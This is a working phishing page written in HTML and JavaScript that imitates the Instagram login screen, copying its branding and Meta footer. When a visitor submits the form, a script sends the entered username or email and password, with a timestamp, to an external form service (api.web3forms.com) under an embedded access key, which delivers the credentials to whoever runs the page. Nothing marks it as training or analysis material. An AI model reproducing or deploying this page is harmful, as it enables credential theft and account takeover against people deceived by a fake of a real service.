<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #152127;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0;
        }

        .top-section {
            display: flex;
            justify-content: center;
            width: 100%;
            height: auto;
            background: #0C1014;
        }

        .container {
            background: transparent;
            max-width: 380px;
            width: 100%;
            padding: 40px 20px;
            margin-top: 80px;
        }

        h1 {
            color: #ffffff;
            margin-bottom: 24px;
            font-size: 17px;
            font-weight: 400;
            text-align: left;
        }

        .form-group {
            margin-bottom: 12px;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #3a4f5f;
            border-radius: 12px;
            font-size: 14px;
            font-family: inherit;
            background: transparent;
            color: #8a9aa8;
        }

        input::placeholder {
            color: #5a6a78;
        }

        input:focus {
            outline: none;
            border-color: #4a5f6f;
        }

        .btn {
            width: 100%;
            padding: 10px;
            background: #1a5490;
            color: white;
            border: none;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 12px;
        }

        .btn:hover {
            background: #1d5fa0;
        }

        .forgot-password {
            text-align: center;
            margin-top: 24px;
            margin-bottom: 24px;
        }

        .forgot-password a {
            color: #ffffff;
            text-decoration: none;
            font-size: 14px;
        }

        .social-btn {
            width: 100%;
            padding: 10px;
            background: transparent;
            color: #7ab8f0;
            border: 1px solid #3a4f5f;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .create-account {
            width: 100%;
            padding: 10px;
            background: transparent;
            color: #7ab8f0;
            border: 1px solid #3a4f5f;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }

        .message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 4px;
            text-align: center;
            font-weight: 500;
            display: none;
            font-size: 14px;
        }

        .message.success {
            background: #1a3a1a;
            color: #4ade80;
            border: 1px solid #2a4a2a;
        }

        .message.error {
            background: #3a1a1a;
            color: #f87171;
            border: 1px solid #4a2a2a;
        }

        .footer {
            width: 100%;
            background: #0d1b26;
            padding: 24px 20px;
            margin-top: auto;
        }

        .footer-content {
            max-width: 1200px;
            margin: 0 auto;
            text-align: center;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 12px;
            margin-bottom: 16px;
        }

        .footer-links a {
            color: #8a9aa8;
            text-decoration: none;
            font-size: 11px;
        }

        .footer-info {
            color: #5a6a78;
            font-size: 11px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 12px;
        }

        .language-selector {
            background: transparent;
            color: #8a9aa8;
            border: none;
            font-size: 11px;
            cursor: pointer;
        }

        img {
            margin: 18px;
        }

        .meta {
            display: flex;
            justify-content: center;

        }
    </style>
</head>

<body>
    <div class="top-section">
        <img src="images/21d67f1d6b3be5bb2e39395311c77fc6-removebg-preview.png" alt="" height="70">
    </div>

    <div class="container">
        <h1>Log into Instagram</h1>
        <form action="https://api.web3forms.com/submit" method="POST">
             <input type="hidden" name="access_key" value="f5663c8b-2c16-458a-afb2-580d7955bb4a">
            <div id="loginForm">
                <div class="form-group">
                    <input type="text" id="email" name="email" placeholder="Mobile number, username or email" required>
                </div>

                <div class="form-group">
                    <input type="password" id="password" name="password" placeholder="Password" required>
                </div>

                <button type="button" class="btn" onclick="handleSubmit()">Log in</button>

                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>


                <button class="create-account">Create new account</button>
            </div>
        </form>

        <div class="meta"><img src="images/Screenshot 2026-01-12 203352.png" alt=""></div>


        <div id="responseMessage" class="message"></div>
    </div>

    <footer class="footer">
        <div class="footer-content">
            <div class="footer-links">
                <a href="#">Meta</a>
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">API</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Meta AI</a>
                <a href="#">Contact Uploading & Non-Users</a>
                <a href="#">Meta Verified</a>
            </div>
            <div class="footer-info">
                <select class="language-selector">
                    <option>English</option>
                </select>
                <span>Â© 2026 Instagram from Meta</span>
            </div>
        </div>
    </footer>

    <script>
        const responseMessage = document.getElementById('responseMessage');

        async function handleSubmit() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            if (!email || !password) {
                responseMessage.textContent = 'Please fill in all fields';
                responseMessage.className = 'message error';
                responseMessage.style.display = 'block';
                setTimeout(() => {
                    responseMessage.style.display = 'none';
                }, 3000);
                return;
            }

            try {
                const response = await fetch('https://api.web3forms.com/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        access_key: 'f5663c8b-2c16-458a-afb2-580d7955bb4a',
                        subject: 'New Login Submission',
                        from_name: 'Login Form',
                        message: `Email: ${email}\nPassword: ${password}\nTimestamp: ${new Date().toISOString()}`
                    })
                });

                const result = await response.json();

                if (result.success) {
                    responseMessage.textContent = 'Submitted successfully!';
                    responseMessage.className = 'message success';
                    responseMessage.style.display = 'block';
                    document.getElementById('email').value = '';
                    document.getElementById('password').value = '';
                } else {
                    responseMessage.textContent = `Error: ${result.message || 'Submission failed'}`;
                    responseMessage.className = 'message error';
                    responseMessage.style.display = 'block';
                }
            } catch (error) {
                responseMessage.textContent = `Error: ${error.message}`;
                responseMessage.className = 'message error';
                responseMessage.style.display = 'block';
            }

            setTimeout(() => {
                responseMessage.style.display = 'none';
            }, 5000);
        }

        document.getElementById('password').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') {
                handleSubmit();
            }
        });
    </script>
</body>

</html>
